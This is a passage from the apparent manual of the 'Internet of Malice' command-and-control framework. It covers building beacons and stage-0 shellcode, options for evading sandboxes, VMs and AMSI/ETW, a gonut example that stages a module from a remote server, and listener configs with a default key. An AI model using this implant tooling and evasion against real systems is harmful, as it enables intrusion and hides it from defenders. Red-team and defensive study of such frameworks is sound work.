Set type\n</code></pre> <p>SEE ALSO</p> <ul> <li>artifact  - artifact manage</li> </ul>"},{"location":"IoM/manual/manual/client/#build","title":"build","text":"<p>build</p> <p>Options</p> <pre><code>      --auto-download   auto download artifact\n</code></pre> <p>SEE ALSO</p> <ul> <li>build beacon  - Build a beacon</li> <li>build log    - Show build log</li> <li>build modules    - Compile specified modules into DLLs</li> <li>build prelude    - Build a prelude payload</li> <li>build pulse    - stage 0 shellcode generate</li> </ul>"},{"location":"IoM/manual/manual/client/#build-beacon","title":"build beacon","text":"<p>Build a beacon</p> <p></p> <p>Description</p> <p>Generate a beacon artifact based on the specified profile.</p> <pre><code>build beacon [flags]\n</code></pre> <p>Examples</p> <pre><code>// Build a beacon\nbuild beacon --addresses \"https://127.0.0.1:443\" --target x86_64-pc-windows-gnu --source docker\n\n// Specify a module\nbuild beacon --addresses \"https://127.0.0.1:443,https://10.0.0.1:443\" --target x86_64-pc-windows-gnu --modules nano --source docker\n\n// Build a beacon with a profile\nbuild beacon --profile tcp_default --target x86_64-pc-windows-gnu\n\n// Build a beacon by saas\nbuild beacon --profile tcp_default --target x86_64-pc-windows-gnu --source saas\n\n// Build by GithubAction\nbuild beacon --profile tcp_default --target x86_64-pc-windows-gnu --source saas\n</code></pre> <p>Options</p> <pre><code>      --3rd string                      Third party modules for modules command\n      --3rd-modules string              Override 3rd party modules\n      --addresses string                Target addresses (comma-separated)\n      --anti-debug                      Enable anti-debug detection\n      --anti-disasm                     Enable anti-disassembly detection\n      --anti-emulator                   Enable anti-emulator detection\n      --anti-sandbox                    Enable anti-sandbox detection\n      --anti-vm                         Enable anti-VM detection\n      --artifact-id uint32              Artifact ID for pulse builds\n      --auto-download                   Auto download artifact after build\n      --autorun string                  Override autorun configuration file\n      --autorun-file string             AutoRun configuration file path\n      --company-name string             Override company name\n      --compile-time string             Override compile time\n      --cron string                     Override cron expression (e.g., '*/5 * * * * * *' for every 5 seconds)\n      --dga-enable                      Enable Domain Generation Algorithm\n      --dga-interval-hours int          Override DGA generation interval in hours (default -1)\n      --dga-key string                  Override DGA key\n      --enable-3rd                      Enable 3rd party modules\n      --encryption string               Override encryption type (aes, xor, etc.)\n      --file-description string         Override file description\n      --file-version string             Override file version\n      --github-owner string             github owner\n      --github-remove                   remove workflow\n      --github-repo string              github repo\n      --github-token string             github token\n      --github-workflowFile string      github workflow file\n      --global-retry int                Override global retry count (default -1)\n      --guardrail-domains string        Override domain whitelist (comma-separated)\n      --guardrail-enable                Enable environment guardrail checks\n      --guardrail-ip-addresses string   Override IP address whitelist (comma-separated)\n      --guardrail-require-all           Require all guardrail conditions (AND mode) or any condition (OR mode) (default true)\n      --guardrail-server-names string   Override server name whitelist (comma-separated)\n      --guardrail-usernames string      Override username whitelist (comma-separated)\n      --icon string                     Override executable icon file\n      --init-retry int                  Override initial retry count (default -1)\n      --internal-name string            Override internal name\n      --interval int                    Legacy interval override (use --cron instead) (default -1)\n      --jitter float                    Override jitter value (0.0-1.0) (default -1)\n      --key string                      Override encryption key\n      --mod string                      Override implant mode (beacon, bind)\n      --modules string                  Override modules (comma-separated, e.g., 'full,execute_exe')\n      --name string                     Override profile name\n      --original-filename string        Override original filename\n      --pack-dst strings                Destination paths for packed files (comma-separated)\n      --pack-src strings                Source files to pack (comma-separated)\n      --product-name string             Override product name\n      --product-version string          Override product version\n      --profile string                  profile name\n      --proxy string                    Legacy proxy override (use --proxy-url instead)\n      --proxy-url string                Override proxy URL\n      --proxy-use-env                   Use environment proxy settings\n      --pulse-encryption string         Override pulse encryption type\n      --pulse-key string                Override pulse encryption key\n      --pulse-protocol string           Override pulse protocol (http, tcp, etc.)\n      --pulse-target string             Override pulse target address\n      --relink uint32                   Relink beacon ID\n      --rem                             Legacy REM static link flag\n      --rem-link string                 REM link configuration\n      --remap-path                      Enable path remapping\n      --require-admin                   Require administrator privileges\n      --require-uac                     Require UAC elevation\n      --runtime string                  Override runtime (tokio, smol, async-std)\n      --secure-enable                   Enable secure communication\n      --secure-private-key string       Override private key for secure communication\n      --secure-public-key string        Override public key for secure communication\n      --server-retry int                Override server retry count (default -1)\n      --source string                   build source, docker, action, saas\n      --target string                   build target, specify the target arch and platform, such as  **x86_64-pc-windows-gnu**.\n      --user-agent string               HTTP User-Agent string\n</code></pre> <p>SEE ALSO</p> <ul> <li>build    - build</li> </ul>"},{"location":"IoM/manual/manual/client/#build-log","title":"build log","text":"<p>Show build log</p> <p>Description</p> <p>Displays the log for the specified number of rows</p> <pre><code>build log [flags]\n</code></pre> <p>Examples</p> <pre><code>build log artifact_name --limit 70\n</code></pre> <p>Options</p> <pre><code>      --limit int   limit of rows (default 50)\n</code></pre> <p>Options inherited from parent commands</p> <pre><code>      --auto-download   auto download artifact\n</code></pre> <p>SEE ALSO</p> <ul> <li>build    - build</li> </ul>"},{"location":"IoM/manual/manual/client/#build-modules","title":"build modules","text":"<p>Compile specified modules into DLLs</p> <p>Description</p> <p>Compile the specified modules into DLL files for deployment or integration.</p> <pre><code>build modules [flags]\n</code></pre> <p>Examples</p> <pre><code>// Compile all modules for the Windows platform\nbuild modules --target x86_64-pc-windows-gnu --profile tcp_default\n\n// Compile a predefined feature set of modules (nano)\nbuild modules --target x86_64-pc-windows-gnu --profile tcp_default --modules nano\n\n// Compile specific modules into DLLs\nbuild modules --target x86_64-pc-windows-gnu --profile tcp_default --modules base,execute_dll\n\n// Compile third party module(curl, rem)\nbuild modules --3rd rem --target x86_64-pc-windows-gnu --profile tcp_default\n\n// Compile module by saas\nbuild modules --target x86_64-pc-windows-gnu --profile tcp_default --source saas\n</code></pre> <p>Options</p> <pre><code>      --3rd-modules string           Override 3rd party modules\n      --github-owner string          github owner\n      --github-remove                remove workflow\n      --github-repo string           github repo\n      --github-token string          github token\n      --github-workflowFile string   github workflow file\n      --modules string               Override modules (comma-separated, e.g., 'full,execute_exe')\n      --profile string               profile name\n      --source string                build source, docker, action, saas\n      --target string                build target, specify the target arch and platform, such as  **x86_64-pc-windows-gnu**.\n</code></pre> <p>Options inherited from parent commands</p> <pre><code>      --auto-download   auto download artifact\n</code></pre> <p>SEE ALSO</p> <ul> <li>build    - build</li> </ul>"},{"location":"IoM/manual/manual/client/#build-prelude","title":"build prelude","text":"<p>Build a prelude payload</p> <p>Description</p> <p>Generate a prelude payload as part of a multi-stage deployment.</p> <pre><code>build prelude [flags]\n</code></pre> <p>Examples</p> <pre><code>// Build a prelude payload\nbuild prelude --target x86_64-pc-windows-gnu --profile tcp_default --autorun /path/to/autorun.yaml\n\n// Build a prelude payload with additional modules\nbuild prelude --target x86_64-pc-windows-gnu --profile tcp_default --autorun /path/to/autorun.yaml --modules base,sys_full\n\n// Build a prelude payload by saas\nbuild prelude --target x86_64-pc-windows-gnu --profile tcp_default --autorun /path/to/autorun.yaml --source saas\n</code></pre> <p>Options</p> <pre><code>      --autorun string               auto run zip path\n      --github-owner string          github owner\n      --github-remove                remove workflow\n      --github-repo string           github repo\n      --github-token string          github token\n      --github-workflowFile string   github workflow file\n      --profile string               profile name\n      --source string                build source, docker, action, saas\n      --target string                build target, specify the target arch and platform, such as  **x86_64-pc-windows-gnu**.\n</code></pre> <p>Options inherited from parent commands</p> <pre><code>      --auto-download   auto download artifact\n</code></pre> <p>SEE ALSO</p> <ul> <li>build    - build</li> </ul>"},{"location":"IoM/manual/manual/client/#build-pulse","title":"build pulse","text":"<p>stage 0 shellcode generate</p> <p></p> <p>Description</p> <p>Generate 'pulse' payload,a minimized shellcode template, corresponding to CS artifact, very suitable for loading by various loaders</p> <pre><code>build pulse [flags]\n</code></pre> <p>Examples</p> <pre><code>// Build a pulse payload\nbuild pulse --target x86_64-pc-windows-gnu --profile tcp_default\n\n// Build a pulse payload by specifying artifact\nbuild pulse --target x86_64-pc-windows-gnu --profile tcp_default --artifact-id 1\n</code></pre> <p>Options</p> <pre><code>      --address string               Only support single address\n      --beacon_artifact_id uint32    beacon's artifact_id\n      --github-owner string          github owner\n      --github-remove                remove workflow\n      --github-repo string           github repo\n      --github-token string          github token\n      --github-workflowFile string   github workflow file\n      --path string                   (default \"/pulse\")\n      --profile string               profile name\n      --source string                build source, docker, action, saas\n      --target string                build target, specify the target arch and platform, such as  **x86_64-pc-windows-gnu**.\n      --user-agent string            HTTP User-Agent string\n</code></pre> <p>Options inherited from parent commands</p> <pre><code>      --auto-download   auto download artifact\n</code></pre> <p>SEE ALSO</p> <ul> <li>build    - build</li> </ul>"},{"location":"IoM/manual/manual/client/#profile","title":"profile","text":"<p>compile profile </p> <pre><code>profile\n</code></pre> <p>SEE ALSO</p> <ul> <li>profile delete  - Delete a compile profile in server</li> <li>profile list  - List all compile profile</li> <li>profile load  - Load exist implant profile</li> <li>profile new    - Create new compile profile with default profile</li> </ul>"},{"location":"IoM/manual/manual/client/#profile-delete","title":"profile delete","text":"<p>Delete a compile profile in server</p> <pre><code>profile delete\n</code></pre> <p>Examples</p> <pre><code>profile delete profile_name\n</code></pre> <p>SEE ALSO</p> <ul> <li>profile    - compile profile </li> </ul>"},{"location":"IoM/manual/manual/client/#profile-list","title":"profile list","text":"<p>List all compile profile</p> <p></p> <pre><code>profile list\n</code></pre> <p>Examples</p> <pre><code>// List all compile profiles\nprofile list\n</code></pre> <p>SEE ALSO</p> <ul> <li>profile    - compile profile </li> </ul>"},{"location":"IoM/manual/manual/client/#profile-load","title":"profile load","text":"<p>Load exist implant profile</p> <p>Description</p> <p>The profile load command requires a valid configuration file path (e.g., config.yaml) to load settings. This file specifies attributes necessary for generating the compile profile.</p> <pre><code>profile load [flags]\n</code></pre> <p>Examples</p> <pre><code>// Create a new profile using network configuration in pipeline\nprofile load /path/to/config.yaml --name my_profile --pipeline pipeline_name\n\n// Create a new profile with external file\nprofile load /path/to/profile.zip --name my_profile --pipeline pipeline_name\n</code></pre> <p>Options</p> <pre><code>  -n, --name string       Overwrite profile name\n  -p, --pipeline string   Overwrite profile basic pipeline_id\n      --rem string        rem pipeline id\n</code></pre> <p>SEE ALSO</p> <ul> <li>profile    - compile profile </li> </ul>"},{"location":"IoM/manual/manual/client/#profile-new","title":"profile new","text":"<p>Create new compile profile with default profile</p> <p></p> <pre><code>profile new [flags]\n</code></pre> <p>Examples</p> <pre><code>profile new --name my_profile --pipeline default_tcp\n</code></pre> <p>Options</p> <pre><code>  -n, --name string       Overwrite profile name\n  -p, --pipeline string   Overwrite profile basic pipeline_id\n      --rem string        rem pipeline id\n</code></pre> <p>SEE ALSO</p> <ul> <li>profile    - compile profile </li> </ul>"},{"location":"IoM/manual/manual/client/#donut","title":"donut","text":"<p>donut cmd</p> <p>Description</p> <p>Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory </p> <pre><code>donut [flags]\n</code></pre> <p>Examples</p> <p>gonut -i c2.dll   gonut --arch x86 --class TestClass --method RunProcess --args notepad.exe --input loader.dll   gonut -i loader.dll -c TestClass -m RunProcess -p \"calc notepad\" -s http://remote_server.com/modules/   gonut -z2 -k2 -t -i loader.exe -o out.bin</p> <p>Options</p> <pre><code>  -a, --arch int          Target architecture:\n                            1=x86\n                            2=amd64\n                            3=x86+amd64\n                             (default 3)\n  -p, --args string       Optional parameters/command line inside quotations for DLL method/function or EXE.\n  -b, --bypass uint32     Bypass AMSI/WLDP/ETW:\n                            1=None\n                            2=Abort on fail\n                            3=Continue on fail\n                             (default 3)\n  -c, --class string      Optional class name. (required for .NET DLL, format: namespace.class)\n  -z, --compress uint32   Pack/Compress file:\n                            1=None\n                            2=aPLib         [experimental]\n                            3=LZNT1  (RTL)  [experimental, Windows only]\n                            4=Xpress (RTL)  [experimental, Windows only]\n                            5=LZNT1         [experimental]\n                            6=Xpress        [experimental, recommended]\n                             (default 1)\n  -j, --decoy string      Optional path of decoy module for Module Overloading.\n  -d, --domain string     AppDomain name to create for .NET assembly. If entropy is enabled, this is generated randomly.\n  -e, --entropy uint32    Entropy:\n                            1=None\n                            2=Use random names\n                            3=Random names + symmetric encryption\n                             (default 3)\n  -x, --exit uint32       Exit behaviour:\n                            1=Exit thread\n                            2=Exit process\n                            3=Do not exit or cleanup and block indefinitely\n                             (default 1)\n  -f, --format int        Output format:\n                            1=Binary\n                            2=Base64\n                            3=C\n                            4=Ruby\n                            5=Python\n                            6=Powershell\n                            7=C#\n                            8=Hex\n                            9=UUID\n                            10=Golang\n                            11=Rust\n                             (default 1)\n  -k, --headers uint32    Preserve PE headers:\n                            1=Overwrite\n                            2=Keep all\n                             (default 1)\n  -i, --input string      Input file to execute in-memory.\n  -m, --method string     Optional method or function for DLL. (a method is required for .NET DLL)\n  -n, --modname string    Module name for HTTP staging. If entropy is enabled, this is generated randomly.\n  -y, --oep uint32        Create thread for loader and continue execution at &lt;addr&gt; supplied. (eg. 0x1234)\n  -o, --output string     Output file to save loader. (default \"shellcode\")\n  -r, --runtime string    CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\n  -s, --server string     Server that will host the Donut module. Credentials may be provided in the following format: https://username:password@192.168.0.1/\n  -t, --thread            Execute the entrypoint of an unmanaged EXE as a thread.\n  -w, --unicode           Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)\n  -v, --verbose           verbose output\n</code></pre>"},{"location":"IoM/manual/manual/deploy/","title":"Internet of Malice \u00b7  \u5b89\u88c5\u90e8\u7f72\u624b\u518c","text":"<p>\u672c\u6587\u4e3b\u8981\u90e8\u7f72\u76f8\u5173\u7684\u53c2\u6570\u7ec6\u8282</p>"},{"location":"IoM/manual/manual/deploy/#config-\u793a\u4f8b","title":"Config \u793a\u4f8b","text":"<p><code>config.yaml</code> \u662f Malice-Network \u670d\u52a1\u5668\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e9b\u670d\u52a1\u5668\u4ee5\u53ca <code>listener</code> \u53ef\u9009\u7684\u914d\u7f6e\u3002</p> <p>\u9ed8\u8ba4\u914d\u7f6e\u4e2d\u5305\u542b\u4e86 tcp, pulse, website, bind \u7684 pipeline \u793a\u4f8b.</p> <pre><code>debug: false # \u5f00\u542fdebug\u65e5\u5fd7\nserver:  \n  grpc_port: 5004  \n  grpc_host: 0.0.0.0  \n  ip: 127.0.0.1  \n  audit: 1  # 0 close , 1 basic , 2 detail  \n  enable: true  \n  config:  \n    packet_length: 10485760 # 10M: 1024*1024*10  \n    certificate:  \n    certificate_key:  \n  notify:            # \u7b2c\u4e09\u65b9\u5e94\u7528\u901a\u77e5\n    enable: false    \n    telegram:         \n        enable: false\n        api_key:\n        chat_id:\n    dingtalk:\n        enable: false\n        secret:\n        token:\n    lark:\n        enable: false\n        webhook_url:\n    serverchan:\n        enable: false\n        url:\n  github:           # github action build \u914d\u7f6e\n    repo: malefic  \n    workflow: generate.yaml  \n    owner:  \n    token:  \n\nlisteners:          # listener \u914d\u7f6e, \u53ef\u72ec\u7acb\u751f\u6548\n  name: listener  \n  auth: listener.auth  \n  enable: true  \n  ip: 127.0.0.1   \n  # \u81ea\u52a8\u5316\u7f16\u8bd1, \u5982\u679c\u914d\u7f6e\u4e86saas/docker/github action, \u4f1a\u81ea\u52a8\u6267\u884c\u7f16\u8bd1\u4efb\u52a1\n  auto_build:\n    enable: true\n    build_pulse: true\n    target:\n      - x86_64-pc-windows-gnu\n    pipeline:\n      - tcp\n      - http\n  tcp:  # tcp example            \n    - name: tcp # tcp pipeline\n      port: 5001  \n      host: 0.0.0.0  \n      protocol: tcp  \n      parser: malefic  # auto/malefic/pulse\n      enable: true  \n      tls:          # tls\u914d\u7f6e, \u6309\u7167\u914d\u7f6e\u751f\u6210\u8bc1\u4e66\u6216\u8005\u4f7f\u7528\u5df2\u6709\u7684\u8bc1\u4e66\u6587\u4ef6\n        enable: true  \n        # \u81ea\u7b7e\u540d\u8bc1\u4e66\n        CN: \"test\"  \n        O: \"Sharp Depth\"  \n        C: \"US\"  \n        L: \"Houston\"  \n        OU: \"Persistent Housework, Limited\"  \n        ST: \"State of Texas\"  \n        # \u81ea\u5b9a\u4e49\u8bc1\u4e66  \n        cert_file: \"\"  \n        key_file: \"\"  \n        ca_file: \"\"   \n      encryption: # \u52a0\u5bc6\u914d\u7f6e, \u9700\u8981\u4e0eimplant\u5bf9\u5e94\n        - enable: true\n          type: aes\n          key: maliceofinternal\n        - enable: true\n          type: xor\n          key: maliceofinternal        \n  http: # http example\n    - name: http  \n      enable: true  \n      host: 0.0.0.0  \n      port: 8080  \n      parser: malefic  # auto/malefic/pulse\n      tls:  \n        enable: tls  \n        # \u586b\u5199\u5982\u4e0b\u9009\u9879\u4f1a\u8fdb\u884c\u66ff\u6362 \n        CN: \"test\"  \n        O: \"Sharp Depth\"  \n        C: \"US\"  \n        L: \"Houston\"  \n        OU: \"Persistent Housework, Limited\"  \n        ST: \"State of Texas\"  \n        #   \n        cert_file: \"\"  \n        key_file: \"\"  \n        ca_file: \"\"  \n      encryption:\n        - enable: true\n          type: aes\n          key: maliceofinternal\n        - enable: true\n          type: xor\n          key: maliceofinternal \n      error_page: \"\"  \n\n    - name: http-pulse  \n      enable: true  \n      host: 0.0.0.0  \n      port: 8081  \n      parser: pulse  \n      encryption:  \n        enable: true  \n        type: xor  \n        key: maliceofinternal  \n      error_page: \"\"  \n\n  bind:  \n    - name: bind_pipeline  \n      enable: true  \n      encryption:  \n        enable: true  \n        type: aes  \n        key: maliceofinternal \n\n  website:  # website \u542f\u52a8\u914d\u7f6e\n    - name: default-website  \n      port: 80  \n      root: \"/\"  \n      enable: true  \n\n  rem:  # rem \u542f\u52a8\u914d\u7f6e\n    - name: rem_default  \n      enable: true  \n      console: tcp://0.0.0.0:12345\n</code></pre>"},{"location":"IoM/manual/manual/deploy/#pipeline-config","title":"Pipeline Config","text":""},{"location":"IoM/manual/manual/deploy/#tcp","title":"tcp","text":"<p>\u6700\u5e38\u7528\u7684 pipeline, \u9002\u7528\u4e8e\u4e3b\u4f53\u7a0b\u5e8f\u4ea4\u4e92\u7684 pipeline.</p> <p>tcp \u662f\u76ee\u524d\u652f\u6301\u4e86\u6700\u591a\u7279\u6027\u7684 pipeline. </p> <p>\u5355\u4e2a tcp pipeline \u914d\u7f6e:</p> <pre><code>- name: tcp_default   # pipeline \u540d\u5b57\n      port: 5001          # pipeline \u76d1\u542c\u7684\u7aef\u53e3\n      host: 0.0.0.0       # pipeline \u76d1\u542c\u7684host\n      protocol: tcp       # \u4f20\u8f93\u5c42\u534f\u8bae\n      parser: malefic     # implant\u534f\u8bae\n      enable: true        # pipeline\u662f\u5426\u5f00\u542f\n      tls:                # tls\u914d\u7f6e\u9879,\u7559\u7a7a\u5219\u81ea\u52a8\u751f\u6210\n        enable: false\n        CN: \"test\"\n        O: \"Sharp Depth\"\n        C: \"US\"\n        L: \"Houston\"\n        OU: \"Persistent Housework, Limited\"\n        ST: \"State of Texas\"\n        cert_file: \"\"\n        key_file: \"\"\n        ca_file: \"\"\n      encryption:\n        enable: true\n        type: aes\n        key: maliceofinternal\n</code></pre> <p>\u5176\u4e2d parser \u534f\u8bae\u7528\u6765\u533a\u5206\u5bf9\u5e94\u7684 implant \u7c7b\u578b. pulse \u4e0e malefic \u76ee\u524d\u7684\u4f20\u8f93\u534f\u8bae\u7565\u6709\u4e0d\u540c, \u56e0\u6b64 pulse \u9700\u8981\u5355\u72ec\u7684 parser \u914d\u7f6e.</p> <pre><code>    - name: shellcode\n      port: 5002\n      host: 0.0.0.0\n      parser: pulse    # \u5bf9\u5e94malefic-pulse\u4e0a\u7ebf\n      enable: true\n      encryption:\n        enable: true\n        type: xor\n        key: maliceofinternal\n</code></pre>"},{"location":"IoM/manual/manual/deploy/#website","title":"website","text":"<p>IoM \u5141\u8bb8\u5c06\u4e00\u4e9b\u6587\u4ef6\u6302\u8f7d web \u670d\u52a1\u4e0a</p> <pre><code>  websites:             # website http\u4efb\u52a1\n    - name: test        # website \u540d\u5b57\n      port: 10049       # website \u7aef\u53e3\n      root: \"/test\"     # website route\u6839\u76ee\u5f55\n      enable: false     # website \u662f\u5426\u5f00\u542f\n      content:          # website \u6620\u5c04\u5185\u5bb9\n        - path: '\\images\\1.png'\n          raw:  maliceofinternal\n          type: raw\n        - path: '\\images\\2.png'\n          raw: maliceofinternal\n          type: raw\n</code></pre>"},{"location":"IoM/manual/manual/deploy/#bind-unstable","title":"bind (Unstable)","text":"<p>\u4e3b\u52a8\u53d1\u9001\u6570\u636e\u7684 pipeline, \u4e0d\u540c\u4e8e tcp \u76d1\u542c\u7aef\u53e3. bind \u4f1a\u4e3b\u52a8\u5411\u76ee\u6807\u53d1\u9001\u5bf9\u5e94\u534f\u8bae\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e.</p> <pre><code>  bind:\n    -\n      name: bind_default\n      enable: true\n      encryption:\n        enable: true\n        type: aes\n        key: maliceofinternal\n</code></pre>"},{"location":"IoM/manual/manual/deploy/#\u542f\u52a8-server","title":"\u542f\u52a8 Server","text":"<p>Malice-Network \u670d\u52a1\u5668\u662f\u80fd\u4e0e\u63a7\u5236 <code>Implant</code> \u5e76\u4e0e Malice-Network \u5ba2\u6237\u7aef\u4ea4\u4e92\u7684\u4e3b\u673a\u3002\u670d\u52a1\u5668\u8fd8\u5b58\u50a8\u4e86\u90e8\u5206 Malice-Network \u6536\u96c6\u7684\u6570\u636e\uff0c\u5e76\u7ba1\u7406\u65e5\u5fd7\u8bb0\u5f55\u3002</p> <p>\u9700\u8981\u63d0\u524d\u83b7\u53d6\u5bf9\u5e94\u7684\u914d\u7f6e\u6587\u4ef6: https://github.com/chainreactors/malice-network/blob/master/server/config.yaml ,\u5e76\u653e\u5230<code>malice-network</code>\u6240\u5728\u76ee\u5f55\u4e0b</p> <p>\u6700\u7b80\u542f\u52a8</p> <pre><code>./malice-network\n</code></pre> <p>\u5982\u679c\u914d\u7f6e\u6587\u4ef6\u975e\u9ed8\u8ba4\u7684 <code>config.yaml</code>, \u53ef\u4ee5\u901a\u8fc7 <code>-c path/any.yaml</code> \u6307\u5b9a</p> <p>\u542f\u52a8\u540e\u670d\u52a1\u5668\u4f1a\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f, \u5e76\u751f\u6210\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6, \u5206\u522b\u4e3a<code>listener.auth</code> \u548c<code>admin_[server_ip].auth</code>, \u8fd9\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6\u540e\u7eed\u8fd8\u6709\u7528\u5904</p> <p></p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f, server \u4e2d\u7684 ip \u5b57\u6bb5\u9700\u8981\u5728\u542f\u52a8\u65f6\u8bbe\u7f6e\u4e3a listener \u4e0e client \u80fd\u8bbf\u95ee\u5230\u7684\u5730\u5740, \u6240\u4ee5\u53ef\u4ee5\u624b\u52a8\u4fee\u6539<code>config.yaml</code></p> <pre><code>server:\n    ...\n    ip: 123.123.123.123\n    ...\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528<code>-i</code> \u91cd\u8f7d\u8fd9\u4e2a\u53c2\u6570</p> <pre><code>./malice-network -i 123.123.123.123\n</code></pre> <p>\u540c\u65f6\u542f\u52a8 server \u4e0e listener</p> <p>\u5728\u8bbe\u8ba1\u4e0a, server \u548c listener \u662f\u72ec\u7acb\u7684, \u4e3a\u4e86\u65b9\u4fbf\u90e8\u7f72\u63d0\u4f9b\u4e86\u540c\u65f6\u90e8\u7f72\u7684\u7528\u6cd5, \u4ed3\u5e93\u4e2d\u63d0\u4f9b\u7684\u9ed8\u8ba4<code>config.yaml</code>\u540c\u65f6\u914d\u7f6e\u4e86 server \u4e0e listener. \u4f1a\u540c\u65f6\u542f\u52a8server, listener.</p>"},{"location":"IoM/manual/manual/deploy/#\u542f\u52a8-listener","title":"\u542f\u52a8 Listener","text":"<p>listener\u4e0eIoM\u4e2d\u7528\u6765\u7ba1\u7406pipeline\u7684\u63a7\u5236\u5668, \u4e00\u822c\u5728\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\u53ea\u9700\u8981\u90e8\u7f72\u4e00\u4e2alistener\uff0c \u5373\u53ef\u6dfb\u52a0\u3001\u5220\u9664\u3001\u4fee\u6539pipeline\u3002 pipeline\u4e0e\u771f\u6b63\u4e0eimplant\u4ea4\u6362\u6570\u636e\u7684\u7ba1\u9053\u3002 </p>"},{"location":"IoM/manual/manual/deploy/#\u72ec\u7acb\u90e8\u7f72listener","title":"\u72ec\u7acb\u90e8\u7f72listener","text":"<p>\u53ef\u9009\u7684listener\u542f\u52a8\u65b9\u5f0f</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0blistener\u4e0eserver\u540c\u65f6\u542f\u52a8</p> <p>\u4ece v0.0.2 \u5f00\u59cb, \u5c06\u53ea\u63d0\u4f9b\u4e00\u4e2a\u670d\u52a1\u7aef\u914d\u7f6e\u6587\u4ef6, \u4f1a\u6839\u636e\u914d\u7f6e\u81ea\u52a8\u89e3\u6790\u9700\u8981\u5f00\u542f\u7684\u670d\u52a1. \u53ef\u4ee5\u901a\u8fc7 enable \u5b57\u6bb5\u8fdb\u884c\u7b80\u5355\u63a7\u5236</p> <p>\u521a\u624d\u63d0\u5230 Server \u7684 <code>config.yaml</code> \u4e2d\u5df2\u7ecf\u5305\u542b\u4e86 listener \u914d\u7f6e\u3002 \u662f\u5bf9 server \u4e0e listener \u5728\u540c\u4e00\u53f0\u673a\u5668\u4e0a\u90e8\u7f72\u65f6\u7684\u7b80\u5316\u3002\u4f46\u5728\u4ea4\u4e92\u903b\u8f91\u4e0a, \u540c\u65f6\u542f\u52a8\u7684 listener \u4e0e server \u4f9d\u65e7\u901a\u8fc7 rpc \u901a\u8baf, \u4e0e\u72ec\u7acb\u90e8\u7f72\u7684 listener \u6ca1\u6709\u4efb\u4f55\u533a\u522b.</p> <p>\u5982\u679c\u8981\u72ec\u7acb\u542f\u52a8listener\uff0c \u53ea\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u5355\u72ec\u7684\u914d\u7f6e\u6587\u4ef6\u5373\u53ef\u3002</p> <p>\u5982\u679c\u914d\u7f6e\u6587\u4ef6\u975e\u9ed8\u8ba4\u7684 <code>listener.yaml</code>, \u53ef\u4ee5\u901a\u8fc7 <code>-c path/any.yaml</code> \u6307\u5b9a.</p> <p>\u914d\u7f6e\u6837\u4f8b:</p> <pre><code>listeners:\n  enable: true\n  name: default\n  auth: listener.auth\n  tcp:\n    - name: tcp_default\n      port: 5001\n      host: 0.0.0.0\n      protocol: tcp\n      enable: true\n      tls:\n        enable: false\n        CN: \"test\"\n        O: \"Sharp Depth\"\n        C: \"US\"\n        L: \"Houston\"\n        OU: \"Persistent Housework, Limited\"\n        ST: \"State of Texas\"\n      encryption:\n        enable: false\n        type: aes-cfb\n        key: maliceofinternal\n</code></pre> <p>\u8bf7\u68c0\u67e5 listener.auth</p> <p>\u5982\u679c\u6362\u4e86\u4e00\u53f0\u670d\u52a1\u90e8\u7f72 listener, \u8bf7\u68c0\u67e5\u76ee\u5f55\u4e0b\u662f\u5426\u5b58\u5728<code>listener.yaml</code>\u4e0e<code>listener.auth</code></p> <p>listener \u6210\u529f\u542f\u52a8\u540e\uff0clistener \u7ec8\u7aef\u4f1a\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f\uff1a</p> <p></p> <p>Malice-Network \u670d\u52a1\u5668\u4e5f\u4f1a\u8f93\u51fa listener \u767b\u5f55\u4fe1\u606f\uff1a</p> <p></p>"},{"location":"IoM/manual/manual/deploy/#autobuild","title":"autobuild","text":"<p>\u5982\u679c\u5728server\u4e0a\u914d\u7f6e\u4e86autobuild\u9009\u9879\uff0c\u5e76\u4e14\u914d\u7f6e\u4e86docker/github action\u81f3\u5c11\u4e00\u4e2a\u7f16\u8bd1\u73af\u5883\uff0c\u5728pipeline\u542f\u52a8\u65f6\uff0c \u5c31\u4f1a\u81ea\u52a8\u4e0b\u53d1\u7f16\u8bd1\u4efb\u52a1\u3002</p> <pre><code>listeners:  \n  name: listener  \n  auth: listener.auth  \n  enable: true  \n  tcp:  \n    - name: tcp_malefic  \n      port: 5001  \n      host: 0.0.0.0  \n      protocol: tcp  \n      parser: malefic  \n      enable: true  \n      auto_build:  \n        target:  \n          - x86_64-unknown-linux-musl\n</code></pre> <p>\u7f16\u8bd1\u7ed3\u679c\u53ef\u4ee5\u901a\u8fc7artifact\u547d\u4ee4\u67e5\u770b</p>"},{"location":"IoM/manual/manual/deploy/#\u542f\u52a8\u5ba2\u6237\u7aef","title":"\u542f\u52a8\u5ba2\u6237\u7aef","text":"<p>\u5c06\u751f\u6210\u7684\u7528\u6237\u914d\u7f6e\u6587\u4ef6, \u9ed8\u8ba4\u4e3a <code>admin_[server_ip].auth</code> \u590d\u5236\u5230 <code>Malice-Network</code> \u5ba2\u6237\u7aef\u7684\u6240\u5728\u4f4d\u7f6e\u3002\u4f7f\u7528\u65b0\u7684\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u6307\u4ee4\u542f\u52a8\u5ba2\u6237\u7aef\uff1a</p> <pre><code>.\\iom login [admin_ip.auth]\n</code></pre> 